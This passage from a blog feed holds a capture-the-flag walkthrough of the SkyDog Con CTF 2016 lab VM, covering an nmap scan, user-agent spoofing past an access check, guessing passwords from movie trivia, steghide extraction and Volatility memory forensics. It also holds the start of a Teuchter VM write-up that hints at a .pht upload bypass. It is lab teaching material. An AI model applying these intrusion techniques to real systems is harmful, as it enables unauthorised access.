</span><span class='line'>                -----------------------------------
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Peace is a lie, there is only passion.  \
</span><span class='line'>| Through passion, I gain strength.       |
</span><span class='line'>| Through strength, I gain power. Through |
</span><span class='line'>| power, I gain victory. Through victory, |
</span><span class='line'>| my chains are broken. The Force shall   |
</span><span class='line'>\ free me.                                /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SkyDog Con CTF 2016 - Catch Me If You Can]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/"/>
    <updated>2018-10-20T11:53:46-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can</id>
    <content type="html"><![CDATA[<p>For this box, you have to find 8 flags, each containing an MD5 hash.</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -sC -sV -p- 192.168.145.136
</span><span class='line'>
</span><span class='line'>PORT      STATE  SERVICE  VERSION
</span><span class='line'>22/tcp    closed ssh
</span><span class='line'>80/tcp    open   http     Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: SkyDog Con CTF 2016 - Catch Me If You Can
</span><span class='line'>443/tcp   open   ssl/http Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: SkyDog Con CTF 2016 - Catch Me If You Can
</span><span class='line'>| ssl-cert: Subject: commonName=Network Solutions EV Server CA 2/organizationName=Network Solutions L.L.C./stateOrProvinceName=VA/countryName=US
</span><span class='line'>| Not valid before: 2016-09-21T14:51:57
</span><span class='line'>|_Not valid after:  2017-09-21T14:51:57
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>| tls-alpn: 
</span><span class='line'>|   http/1.1
</span><span class='line'>22222/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   2048 b6:64:7c:d1:55:46:4e:50:e3:ba:cf:4c:1e:81:f9:db (RSA)
</span><span class='line'>|   256 ef:17:df:cc:db:2e:c5:24:e3:9e:25:16:3d:25:68:35 (ECDSA)
</span><span class='line'>|_  256 0e:1b:3f:c3:4a:56:a0:ef:4d:2a:af:a1:7e:94:d2:06 (ED25519)</span></code></pre></td></tr></table></div></figure>


<h2>Flag #1 Don’t go Home Frank! There’s a Hex on Your House.</h2>

<p>Starting with the web server, the web page is the homepage of the SkyDog con. Poking through the source, I found a suspicious comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--[If IE4]&gt;&lt;script src="http://chousensha.github.io/oldIE/html5.js"&gt;&lt;/script&gt;&lt;![Make sure to remove this before going to PROD]--&gt; </span></code></pre></td></tr></table></div></figure>


<p>Going to the above mentioned JS file, on the first line we find a hex string:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* 666c61677b37633031333230373061306566373164353432363633653964633166356465657d */</span></code></pre></td></tr></table></div></figure>


<p>Decoded, it gives the first flag: <code>flag{7c0132070a0ef71d542663e9dc1f5dee}</code>. And decoding the MD5 hash gives a hint: <code>nmap</code></p>

<h2>Flag #2 Obscurity or Security?</h2>

<p>I already ran Nmap and saw that SSH is listening on port 22222. Trying to SSH as frank gives the next flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh frank@192.168.145.136 -p 22222
</span><span class='line'>The authenticity of host '[192.168.145.136]:22222 ([192.168.145.136]:22222)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '[192.168.145.136]:22222' (ECDSA) to the list of known hosts.
</span><span class='line'>###############################################################
</span><span class='line'>#                         WARNING                             #
</span><span class='line'>#     FBI - Authorized access only!                 # 
</span><span class='line'># Disconnect IMMEDIATELY if you are not an authorized user!!! #
</span><span class='line'>#         All actions Will be monitored and recorded          #
</span><span class='line'># Flag{53c82eba31f6d416f331de9162ebe997}            #
</span><span class='line'>###############################################################
</span><span class='line'>frank@192.168.145.136's password: </span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The decoded hint is <code>encrypt</code></p>

<h2>Flag #3 Be Careful Agent, Frank Has Been Known to Intercept Traffic Our Traffic.</h2>

<p>Remember that Nmap found also port 443 open, so I switched to https to check it out and was greeted by a self-signed certificate. Viewing the certificate gives the third flag: <code>flag3{f82366a9ddc064585d54e3f78bde3221}</code></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/skydogctf/flag3.jpg" title="flag3" alt="flag3"></p>

<p>And the next hint is <code>personnel</code></p>

<h2>Flag #4 A Good Agent is Hard to Find.</h2>

<p>I tried navigating to /personnel on the web server and it gave me the following message:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ACCESS DENIED!!! You Do Not Appear To Be Coming From An FBI Workstation. Preparing Interrogation Room 1. Car Batteries Charging....</span></code></pre></td></tr></table></div></figure>


<p>So we need a specific user agent. Remembering the included JS file of the first flag, that hinted towards an old Internet Explorer version, I revisited it and searched for the string <em>fbi</em> inside it and found the lines:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* maindev -  6/7/02 Adding temporary support for IE4 FBI Workstations */
</span><span class='line'>/* newmaindev -  5/22/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */</span></code></pre></td></tr></table></div></figure>


<p>So FBI agents use IE4 on their workstations. Cool, nothing catastrophically wrong there. I grabbed an IE4 user agent from <a href="http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,">http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer,</a> changed my User Agent to <code>User-Agent: Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)</code>, and went straight to the FBI portal!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/skydogctf/fbiportal.png" title="fbi portal" alt="fbi portal"></p>

<p>The flag is on the page: <code> flag{14e10d570047667f904261e6d08f520f}</code>, and the decoded value is <code>evidence</code></p>

<h2>Flag #5 The Devil is in the Details &ndash; Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices</h2>

<p>Following up on the clue <em>new+flag</em>, I tried navigating to 192.168.145.136/newevidence and a basic authentication prompt asked me for credentials. On the FBI portal we have the message &ldquo;Welcome Agent Hanratty&rdquo;. A quick Google reveals that this is a reference to agent Carl Hanratty from the movie Catch Me If You Can. I went through the dialogue (hint hint) on the <a href="https://www.imdb.com/title/tt0264464/characters/nm0000158">IMDB page</a> to find out Carl&rsquo;s daughter is called Grace (simple? guessable? personal?). I tried some combinations in the pop up until I found the right one is <em>carl.hanratty/Grace</em> (remember the naming convention of doug.perterson)</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/skydogctf/newevidence.png" title="new evidence" alt="new evidence"></p>

<p>The flag is in the Evidence Summary File: <code>flag{117c240d49f54096413dd64280399ea9}</code>. The hint is <code>panam</code></p>

<h2>Flag #6 Where in the World is Frank?</h2>

<p>For this one you have to work with the other 2 files from the page, the image and the PDF invoice. The invoice mentions an encryption consultation project:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/skydogctf/invoice.jpg" title="invoice" alt="invoice"></p>

<p>This might suggest the use of steganography in the image, and this is confirmed if you search for Stefan Hetzl, it turns out he&rsquo;s the author of steghide! And we have the previous hint of panam, which is the passphrase in this case:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide extract -sf image.jpg 
</span><span class='line'>Enter passphrase: 
</span><span class='line'>wrote extracted data to "flag.txt".
</span><span class='line'>root@kali:~/Downloads# cat flag.txt 
</span><span class='line'>flag{d1e5146b171928731385eb7ea38c37b8}
</span><span class='line'>=ILoveFrance
</span><span class='line'>
</span><span class='line'>clue=iheartbrenda</span></code></pre></td></tr></table></div></figure>


<h2>Flag #7 Frank Was Caught on Camera Cashing Checks and Yelling &ndash; I’m The Fastest Man Alive!</h2>

<p>This was a movie reference and I had to look it up in other solutions&hellip;&ldquo;I’m The Fastest Man Alive!&rdquo; is a reference to The Flash, whose real name is Barry Allen. For the next part, log in to SSH with the the username <em>barryallen</em> and the password <em>iheartbrenda</em>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh barryallen@192.168.145.136 -p 22222
</span><span class='line'>[...]
</span><span class='line'>barryallen@skydogconctf2016:~$ cat flag.txt 
</span><span class='line'>flag{bd2f6a1d5242c962a05619c56fa47ba6}</span></code></pre></td></tr></table></div></figure>


<p>And the hint for the last flag is <code>theflash</code>.</p>

<h2>Flag #8 Franks Lost His Mind or Maybe it’s His Memory. He’s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!</h2>

<p>Inside barryallen&rsquo;s home there&rsquo;s a 72M ZIP file called security-system.data:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>barryallen@skydogconctf2016:~$ file security-system.data 
</span><span class='line'>security-system.data: Zip archive data, at least v2.0 to extract</span></code></pre></td></tr></table></div></figure>


<p>I transferred it to my machine with scp:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>scp -P 22222 barryallen@192.168.145.136:security-system.data .
</span><span class='line'>###############################################################
</span><span class='line'>#                         WARNING                             #
</span><span class='line'>#     FBI - Authorized access only!                 # 
</span><span class='line'># Disconnect IMMEDIATELY if you are not an authorized user!!! #
</span><span class='line'>#         All actions Will be monitored and recorded          #
</span><span class='line'># Flag{53c82eba31f6d416f331de9162ebe997}            #
</span><span class='line'>###############################################################
</span><span class='line'>barryallen@192.168.145.136's password: 
</span><span class='line'>security-system.data                          100%   71MB   6.6MB/s   00:10    </span></code></pre></td></tr></table></div></figure>


<p>I unzipped the archive, but the file command didn&rsquo;t identify it as something specific, it just said it&rsquo;s data. I ran strings on it and saw various references to memory that seem to be linked to a Windows system. Time for some memory forensics with Volatility!</p>

<p>First, we need to identify what type of image we&rsquo;re working with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---------------------------------
</span><span class='line'>Module ImageInfo
</span><span class='line'>---------------------------------
</span><span class='line'>Identify information for the image 
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>volatility imageinfo -f data 
</span><span class='line'>Volatility Foundation Volatility Framework 2.6
</span><span class='line'>INFO    : volatility.debug    : Determining profile based on KDBG search...
</span><span class='line'>          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
</span><span class='line'>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
</span><span class='line'>                     AS Layer2 : FileAddressSpace (/root/Downloads/data)
</span><span class='line'>                      PAE type : PAE
</span><span class='line'>                           DTB : 0x33e000L
</span><span class='line'>                          KDBG : 0x80545b60L
</span><span class='line'>          Number of Processors : 1
</span><span class='line'>     Image Type (Service Pack) : 3
</span><span class='line'>                KPCR for CPU 0 : 0xffdff000L
</span><span class='line'>             KUSER_SHARED_DATA : 0xffdf0000L
</span><span class='line'>           Image date and time : 2016-10-10 22:00:50 UTC+0000
</span><span class='line'>     Image local date and time : 2016-10-10 18:00:50 -0400</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s an image of a Windows XP machine! Next, let&rsquo;s look at the processes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---------------------------------
</span><span class='line'>Module PSList
</span><span class='line'>---------------------------------
</span><span class='line'>Print all running processes by following the EPROCESS lists
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>volatility pslist -f data 
</span><span class='line'>Volatility Foundation Volatility Framework 2.6
</span><span class='line'>Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
</span><span class='line'>---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
</span><span class='line'>0x867c6830 System                    4      0     57      171 ------      0                                                              
</span><span class='line'>0x86262900 smss.exe                332      4      3       19 ------      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x8623b978 csrss.exe               560    332     10      423      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x865ed020 winlogon.exe            588    332     24      512      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x8662d808 services.exe            664    588     15      263      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x866a5670 lsass.exe               676    588     25      356      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x86358a70 vmacthlp.exe            848    664      1       25      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x86651da0 svchost.exe             860    664     21      202      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x865c2790 svchost.exe             944    664     11      258      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x86554020 svchost.exe            1040    664     82     1287      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x866196b8 svchost.exe            1092    664      5       59      0      0 2016-10-10 21:59:14 UTC+0000                                 
</span><span class='line'>0x8643ca18 svchost.exe            1144    664     17      213      0      0 2016-10-10 21:59:15 UTC+0000                                 
</span><span class='line'>0x866fca88 explorer.exe           1540   1520     14      417      0      0 2016-10-10 21:59:16 UTC+0000                                 
</span><span class='line'>0x8656b4d0 spoolsv.exe            1636    664     15      125      0      0 2016-10-10 21:59:16 UTC+0000                                 
</span><span class='line'>0x86338640 VGAuthService.e        1900    664      2       60      0      0 2016-10-10 21:59:25 UTC+0000                                 
</span><span class='line'>0x8667bda0 vmtoolsd.exe           2012    664      9      271      0      0 2016-10-10 21:59:28 UTC+0000                                 
</span><span class='line'>0x864f6440 wmiprvse.exe            488    860     14      251      0      0 2016-10-10 21:59:28 UTC+0000                                 
</span><span class='line'>0x864fbad0 wscntfy.exe             536   1040      1       31      0      0 2016-10-10 21:59:28 UTC+0000                                 
</span><span class='line'>0x85e5dd48 alg.exe                 624    664      8      110      0      0 2016-10-10 21:59:28 UTC+0000                                 
</span><span class='line'>0x866f98b0 vmtoolsd.exe           1352   1540      7      242      0      0 2016-10-10 21:59:29 UTC+0000                                 
</span><span class='line'>0x86674410 ctfmon.exe             1356   1540      1       79      0      0 2016-10-10 21:59:29 UTC+0000                                 
</span><span class='line'>0x865bea48 CCleaner.exe           1388   1540      5      108      0      0 2016-10-10 21:59:29 UTC+0000                                 
</span><span class='line'>0x865c3d78 cmd.exe                1336   1540      1       30      0      0 2016-10-10 22:00:05 UTC+0000                                 
</span><span class='line'>0x8634fbb8 wuauclt.exe            1884   1040      9      198      0      0 2016-10-10 22:00:13 UTC+0000                                 
</span><span class='line'>0x86260a78 wuauclt.exe            1024   1040      6      172      0      0 2016-10-10 22:00:29 UTC+0000                                 
</span><span class='line'>0x8667b488 notepad.exe             268   1540      1       55      0      0 2016-10-10 22:00:41 UTC+0000                                 
</span><span class='line'>0x8640cc10 cmd.exe                1276   2012      0 --------      0      0 2016-10-10 22:00:49 UTC+0000   2016-10-10 22:00:50 UTC+0000 </span></code></pre></td></tr></table></div></figure>


<p>I took note of that Notepad process and several cmd.exes and then dumped the files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---------------------------------
</span><span class='line'>Module FileScan
</span><span class='line'>---------------------------------
</span><span class='line'>Pool scanner for file objects
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>volatility filescan -f data &gt; filelist.txt
</span><span class='line'>Volatility Foundation Volatility Framework 2.6</span></code></pre></td></tr></table></div></figure>


<p>I searched for the string code in the resulting list of files and got a hit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep "code" filelist.txt 
</span><span class='line'>0x0000000005e612f8      1      0 -W-r-- \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
</span><span class='line'>0x00000000062e04b0      1      0 R--r-d \Device\HarddiskVolume1\Documents and Settings\test\Recent\code.txt.lnk
</span><span class='line'>0x00000000064900a0      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\unicode.nls
</span><span class='line'>0x0000000006640bc8      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt</span></code></pre></td></tr></table></div></figure>


<p>Maybe this code.txt file is connected to the running Notepad process. I used Volatility&rsquo;s notepad plugin to dump the text found into Notepad:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---------------------------------
</span><span class='line'>Module Notepad
</span><span class='line'>---------------------------------
</span><span class='line'>List currently displayed notepad text
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>volatility notepad -f data 
</span><span class='line'>Volatility Foundation Volatility Framework 2.6
</span><span class='line'>Process: 268
</span><span class='line'>Text:
</span><span class='line'>?
</span><span class='line'>
</span><span class='line'>Text:
</span><span class='line'>d
</span><span class='line'>
</span><span class='line'>Text:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Text:
</span><span class='line'>?
</span><span class='line'>
</span><span class='line'>Text:
</span><span class='line'>66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 64 38 39 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d</span></code></pre></td></tr></table></div></figure>


<p>We have a hex string! Decoding it yields the final flag: <code>flag{841dd3db29b0fbbd89c7b5be768cdc81}</code>. And the decoded value for the last flag is <code>Two[space]little[space]mice</code></p>

<p>This is it for the SkyDog Con CTF machine! I particularly liked the memory forensics part at the end!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ Q: Do you know what the death rate \
</span><span class='line'>\ around here is? A: One per person. /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Git me some Irn-Bru ye Teuchter!]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter/"/>
    <updated>2018-10-14T08:21:15-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is called Teuchter, and yes, apparently that&rsquo;s a word. There is a theme for this machine, and this why this blog post is also..different. ye will need to hang tight to yer sanity for this one. Or drink some Irn-Bru. Ah had to look at other walkthroughs when Ah got stuck and some time was spent checking Scottish references, but it was all worth it!</p>

<p>So, what&rsquo;s a Teuchter? The Wiktionary definition is:</p>

<blockquote><p>(derogatory) A Highlander especially if Gaelic-speaking; a rural Scot in general; (in Glasgow and
surrounding areas) a Scot with a thick accent from outside west-central Scotland.</p></blockquote>

<p>Some hints from the author:</p>

<blockquote><p>This VM is designed to be a bit of a joke/troll so a translator might be useful.</p>

<p>The challenge isn&rsquo;t over with root. I&rsquo;ve done my usual flag shenanigans.</p>

<p>A bit of info security research and knowing yer target helps here.</p>

<p><a href="http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm">http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm</a></p></blockquote>

<p>And this one:</p>

<blockquote><p>Less hochmagandy and more studying is needed for this one!</p></blockquote>

<p>Ah am sure ye have questions, so:</p>

<blockquote><p>hochmagandy &ndash; Scottish a mainly jocular or literary word for sexual intercourse</p></blockquote>

<p>Isn&rsquo;t this a promising start..</p>

<!-- more -->


<p>Nothing much to start from, just a web server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>|_http-title: Dinnae Pwn Ma Server... Away and Hack some bawbag else!</span></code></pre></td></tr></table></div></figure>


<p>On the homepage there is just a GIF and a message:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/teuchter/web.jpg" title="homepage" alt="web page"></p>

<p>Ran exiftool on the picture and found nothing. However, there are several comments in the source code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- Wullie's favourite film is the Breakfast Club --&gt;
</span><span class='line'>&lt;!-- /gallery/ /flicks/ or /telly/ Maybe Jim Kerr can help with the music...?  --&gt;
</span><span class='line'>&lt;!-- not a lot of people know about different extensions, such as .pht for PHP --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Wullie seems to be the central character here..William? Wallace? We do have a Highlander reference above, and it fits the Scottish theme. While Ah was googling, Ah found this gem on the Urban Dictionary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Wullie is a very caring person who is easy to get on with,
</span><span class='line'>likes all the joys of life.
</span><span class='line'>Meeting and chating to people from all walks of life.
</span><span class='line'>Also known to like a small shandy or two supports the best scottish team the glasgow rangers.
</span><span class='line'>loves to travel and to get home to the family.
</span><span class='line'>what aload of bull shit wullie</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s get back to the challenge, we have 3 potential web directories to check. In the meantime, Ah have Googled for .pht, since Ah have never seen that extension:</p>

<blockquote><p>The pht file extension is associated with the Partial Hypertext file format.</p>

<p>The pht file stores HTML page that includes a PHP script, dynamically generates HTML, often by
accessing database information.</p>

<p>PHT seems to be very little used format.</p>

<p>Mime types:
application/x-httpd-php
text/html</p></blockquote>

<p>Back to the web server, /gallery/ is full of pictures, and the title is Dirty Foties..which Ah think stands for dirty feet. Because ye walk a lot..(someone needs some Irn-Bru)</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/teuchter/gallery.png" title="dirty foties" alt="gallery"></p>

<p>There are more hints in the source code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
